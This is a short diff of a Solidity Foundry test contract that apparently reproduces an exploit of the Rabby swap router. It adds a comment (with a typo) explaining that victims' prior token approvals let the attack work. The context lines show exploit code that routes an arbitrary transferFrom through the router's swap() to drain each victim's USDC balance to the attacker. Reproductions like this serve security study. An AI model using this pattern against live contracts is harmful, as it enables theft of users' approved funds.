@@ -99,6 +99,7 @@ contract Attacker is Test {
             // Step2: If allowance >= balance: exploit!
             if (vic_allowance >= vic_balance) {
                 // Classic arbitrary external calls `swap()` vulnerability, and the parameter `address dexRouter` is controllable.
+                // the addresses already approved the sưap contract to use their USDC that is why transferFrom worked
                 bytes memory usdc_callbackData = abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), vic_balance);
                 IRabbySwap(RabbySwapRouter).swap(usdt, 0, address(this), 4660, usdc, usdc, usdc_callbackData, block.timestamp);
             }
